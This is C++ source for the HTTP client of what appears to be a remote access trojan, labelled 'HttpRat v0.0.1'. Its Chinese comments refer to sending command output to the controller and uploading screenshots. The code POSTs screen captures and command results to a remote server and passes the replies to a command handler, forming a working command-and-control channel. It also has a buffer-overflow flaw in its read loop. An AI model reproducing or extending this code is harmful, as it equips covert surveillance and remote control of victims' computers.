#include "Client.h"
#include "BasicManager.h"
#define BUF_SIZE    (10240)  
// CrackedUrlHINTERNET 
HINTERNET OpenSession(LPCWSTR userAgent = 0)
{
	return WinHttpOpen(userAgent, NULL, NULL, NULL, NULL);

}
HINTERNET Connect(HINTERNET hSession, LPCWSTR serverAddr, int portNo)
{
	return WinHttpConnect(hSession, serverAddr, (INTERNET_PORT) portNo, 0);

}
HINTERNET OpenRequest(HINTERNET hConnect, LPCWSTR verb, LPCWSTR objectName, int scheme)
{    
	DWORD flags = 0;
	if (scheme == INTERNET_SCHEME_HTTPS)
	{        
		flags |= WINHTTP_FLAG_SECURE;   
	}    
	return WinHttpOpenRequest(hConnect, verb, objectName, NULL, NULL, NULL, flags);
}
BOOL AddRequestHeaders(HINTERNET hRequest, LPCWSTR header)
{    
	SIZE_T len = lstrlenW(header);

	return WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);    
}
BOOL SendRequest(HINTERNET hRequest, const void* body, DWORD size)
{
	//第二个参数不能为0！！！！！！不然主控端会收不到output
	return WinHttpSendRequest(hRequest,  L"Content-Type: application/x-www-form-urlencoded\r\n", 0, const_cast<void*>(body), size, size, 0);
	
}
BOOL SendRequest2(HINTERNET hRequest, const void* body, DWORD size)
{
	//WINHTTP_NO_ADDITIONAL_HEADERS第二个参数必须不为L"Content-Type: application/x-www-form-urlencoded\r\n"！！！！！！不然上传不了图片
	return WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, const_cast<void*>(body), size, size, 0);

}

BOOL EndRequest(HINTERNET hRequest)
{

	return WinHttpReceiveResponse(hRequest, 0);
}
BOOL QueryInfo(HINTERNET hRequest, int queryId, char* szBuf, DWORD* pdwSize)
{  
	return WinHttpQueryHeaders(hRequest, (DWORD) queryId, 0, szBuf, pdwSize, 0);
}
BOOL ReadData(HINTERNET hRequest, void* buffer, DWORD length, DWORD* cbRead)
{
	return WinHttpReadData(hRequest, buffer, length, cbRead);
}
void CloseInternetHandle(HINTERNET hInternet)
{    
	if (hInternet)    
	{
		WinHttpCloseHandle(hInternet);

	}
}




CClient::CClient()
{  
   
}

CClient::~CClient()
{

}

int CClient::post(LPCWSTR lpurl,char* strPostData,DWORD dwSize) //上传屏幕截图
{

	HINTERNET hSession = 0;   
	HINTERNET hConnect = 0;   
	HINTERNET hRequest = 0;

	LPCWSTR strHeader1=L"Content-Type: multipart/form-data; boundary=---------------------------7dc2772f010c";
	

	CrackedUrl crackedUrl(lpurl);    

	// Open session.    
	hSession = OpenSession(L"HttpRat v0.0.1");    
	if (hSession == NULL) 
	{       

		printf("Error:Open session!/n");     
		return -1;    
	} 

	// Connect.    
	hConnect = Connect(hSession, crackedUrl.GetHostName(), crackedUrl.GetPort());    
	if (hConnect == NULL) 
	{        
		printf("Error:Connect failed!/n");        
		return -1;   
	}    
	// Open request.   
	hRequest = OpenRequest(hConnect, L"POST", crackedUrl.GetPath(), crackedUrl.GetScheme());    
	if (hRequest == NULL) 
	{        
		printf("Error:OpenRequest failed!/n");       
		return -1;    
	}    
	
	if(!AddRequestHeaders(hRequest,strHeader1))printf("Error:AddRequestHeaders\n");
	

	if (!SendRequest2(hRequest, (const char*)strPostData, dwSize)) 
	{        
		printf("Error:SendRequest failed!/n");     
		return -1;    
	}   
	

	// End request   
	if (!EndRequest(hRequest)) 
	{        
		printf("Error:EndRequest failed!/n");      
		return -1;    }    


	CloseInternetHandle(hRequest);    
	CloseInternetHandle(hConnect);   
	CloseInternetHandle(hSession);   
	return 0; 
}


int CClient::post(LPCWSTR lpurl,char* strPostData)
{

	HINTERNET hSession = 0;   
	HINTERNET hConnect = 0;   
	HINTERNET hRequest = 0;   

	CrackedUrl crackedUrl(lpurl);    
	   
	// Open session.    
	hSession = OpenSession(L"HttpRat v0.0.1");    
	if (hSession == NULL) 
	{       

		printf("Error:Open session!/n");     
		return -1;    
	} 

	// Connect.    
	hConnect = Connect(hSession, crackedUrl.GetHostName(), crackedUrl.GetPort());    
	if (hConnect == NULL) 
	{        
		printf("Error:Connect failed!/n");        
		return -1;   
	}    
	// Open request.   
	hRequest = OpenRequest(hConnect, L"POST", crackedUrl.GetPath(), crackedUrl.GetScheme());    
	if (hRequest == NULL) 
	{        
		printf("Error:OpenRequest failed!/n");       
		return -1;    
	}    


	if (!SendRequest(hRequest, (const char*)strPostData, strlen(strPostData))) 
	{        
		printf("Error:SendRequest failed!/n");     
		return -1;    
	}  
 

	// End request   
	if (!EndRequest(hRequest)) 
	{        
		printf("Error:EndRequest failed!/n");      
		return -1;    
	}  

	BYTE szBuf[BUF_SIZE];   
	DWORD dwSize = 0;   
	szBuf[0] = 0;    
	
	// Query header info.
	int contextLengthId = WINHTTP_QUERY_CONTENT_LENGTH;    
	int statusCodeId = WINHTTP_QUERY_STATUS_CODE;    
	int statusTextId = WINHTTP_QUERY_STATUS_TEXT;

	// read data. 

	for (;;)
	{   
		dwSize = BUF_SIZE;       
		if (ReadData(hRequest, szBuf, dwSize, &dwSize) == FALSE)
		{            
			break;    
		}        
		if (dwSize <= 0) 
		{         
			break;    
		}       
		szBuf[dwSize] = '\0';       

		if (m_pManager==NULL)return 0;

		//printf((char*)szBuf);

		m_pManager->OnReceive(szBuf,dwSize);
		//Output 

	}   
	
	
	CloseInternetHandle(hRequest);    
	CloseInternetHandle(hConnect);   
	CloseInternetHandle(hSession);   
	return 0; 

}
void CClient::setManagerCallBack(CBasicManager *pManager)
{
	m_pManager = pManager;
}

unsigned char CClient::char_to_hex(unsigned char x)
{
	return (unsigned char)(x > 9 ? x + 55: x + 48);
}
int CClient::is_alpha_number_char( unsigned char c )
{
	if ( (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') )
		return 1;
	return 0;
}
DWORD CClient::urlencode( unsigned char * src, int  src_len, unsigned char * dest, int  dest_len )
{
	unsigned char ch;
	int  len = 0;
    char *temp=(char*)dest;
	while (len < (dest_len )&& *src )
	{
		ch = (unsigned char)*src;
		if (*src == ' ') 
		{
			*dest++ = '+';
		}
		else if (is_alpha_number_char(ch) || strchr("-_.!~*'()", ch)) 
		{
			*dest++ = *src;
		}
		else 
		{
			*dest++ = '%';
			*dest++ = char_to_hex( (unsigned char)(ch >> 4) );
			*dest++ = char_to_hex( (unsigned char)(ch % 16) );
		}  
		++src;
		++len;
	}
	*dest = 0;
	return strlen(temp);
}

